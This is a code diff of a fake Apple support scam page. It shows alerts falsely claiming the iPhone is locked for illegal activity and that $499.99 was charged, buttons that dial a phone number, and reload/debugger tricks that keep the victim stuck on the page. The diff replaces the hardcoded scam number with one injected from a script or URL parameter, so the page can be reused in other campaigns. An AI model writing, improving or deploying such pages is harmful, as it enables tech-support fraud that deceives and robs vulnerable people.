@@ -259,13 +259,13 @@
         <div class="ios-notification-body">
             <div class="ios-notification-content">
                 <div class="ios-notification-title">Payment Successful</div>
-                <div class="ios-notification-text"><span>Sent $ 499.99 via Online Transaction to <u>Betonline.net</u> & <u>pornhub.net</u> . Not you? Call +1 (833) 626-2983</span></div>
+                <div class="ios-notification-text"><span>Sent $ 499.99 via Online Transaction to <u>Betonline.net</u> & <u>pornhub.net</u> . Not you? Call <span class="dynamic-phone"></span></span></div>
             </div>
         </div>
     </div>
     <div id="ios-alert-overlay">
         <div id="ios-alert-box">
-            <div class="ios-alert-message">Your iPhone has been locked due to detected illegal activity. Your Apple Account has been disabled! Immediately call Apple Support +1 (833) 626-2983 to unlock it!</div>
+            <div class="ios-alert-message">Your iPhone has been locked due to detected illegal activity. Your Apple Account has been disabled! Immediately call Apple Support <span class="dynamic-phone"></span> to unlock it!</div>
             <div class="ios-alert-buttons-row">
                 <button class="ios-alert-btn-row cancel" onclick="reopenAlert()">Cancel</button>
                 <button class="ios-alert-btn-row ok" onclick="callNumber()">OK</button>
@@ -277,11 +277,11 @@
         <div id="ios-second-alert-box">
             <div class="ios-second-alert-content">
                 <div class="ios-second-alert-message">Your iPhone has been locked due to detected illegal activity .Your
-                    Apple Account has been disabled! Immediately call Apple Support +1 (833) 626-2983 to unlock it!
+                    Apple Account has been disabled! Immediately call Apple Support <span class="dynamic-phone"></span> to unlock it!
                 </div>
             </div>
             <div class="ios-second-alert-buttons">
-                <button class="ios-second-alert-btn" onclick="callNumber()">Call +1 (833) 626-2983</button>
+                <button class="ios-second-alert-btn" onclick="callNumber()">Call <span class="dynamic-phone"></span></button>
                 <button class="ios-second-alert-btn cancel" onclick="reopenSecondAlert()">Cancel</button>
             </div>
         </div>
@@ -406,7 +406,7 @@
                 <div class="ac-ln-background"></div>
                 <div class="ac-ln-content">
                     <span class="ac-ln-title">
-                        <a href="#">Apple Support +1(833) 626-2983 <font color="red">
+                        <a href="#" class="dynamic-phone-link">Apple Support <span class="dynamic-phone"></span> <font color="red">
                                 <font class="js_setPhoneBlock"></font>
                             </font></a>
                     </span>
@@ -499,14 +499,14 @@
                     </div>
                 </div>
                 <meta content="Apple" property="name" />
-                <meta content="+1(833) 626-2983 
-			 " property="telephone" />
+                <meta id="meta-telephone" content="" property="telephone" />
             </section>
         </div>
     </footer>
 
 
 
+    <script src="phone.js"></script>
     <script src="text.js"></script>
     <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
     <script>
@@ -567,7 +567,7 @@
 
         window.number = getPar('phone');
 
-        window.number = (window.number ? window.number : '+1(833) 626-2983 ');
+        window.number = (window.number ? window.number : window.SITE_PHONE_NUMBER);
 
         window.device = 'iPhone';
         window.refef = parseURL(document.referrer);
@@ -679,7 +679,7 @@
 
         function callNumber() {
             okkkk();
-            window.location.href = "tel:+18336262983";
+            window.location.href = "tel:" + window.SITE_PHONE_NUMBER.replace(/[^\d+]/g, "");
         }
 
         function reopenAlert() {
@@ -691,7 +691,7 @@
         }
 
         function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1(833) 626-2983 "></a>');
+            jQuery('#result').append('<a class="anchorcall" href="tel:' + window.SITE_PHONE_NUMBER.replace(/[^\d+]/g, "") + '"></a>');
             document.querySelector('a').click();
             var extraData = "";
             for (itxextraData = 0; itxextraData < 200; itxextraData++) {
@@ -715,6 +715,28 @@
             debugger;
             location.reload();
         }
+    </script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var displayPhone = window.SITE_PHONE_NUMBER;
+            var linkPhone = "tel:" + displayPhone.replace(/[^\d+]/g, '');
+            
+            var phoneSpans = document.querySelectorAll('.dynamic-phone');
+            for (var i = 0; i < phoneSpans.length; i++) {
+                phoneSpans[i].textContent = displayPhone;
+            }
+
+            var phoneLinks = document.querySelectorAll('.dynamic-phone-link');
+            for (var i = 0; i < phoneLinks.length; i++) {
+                phoneLinks[i].href = linkPhone;
+            }
+            
+            var metaTel = document.getElementById('meta-telephone');
+            if(metaTel) {
+                metaTel.content = displayPhone;
+            }
+        });
     </script>
 </body>
 
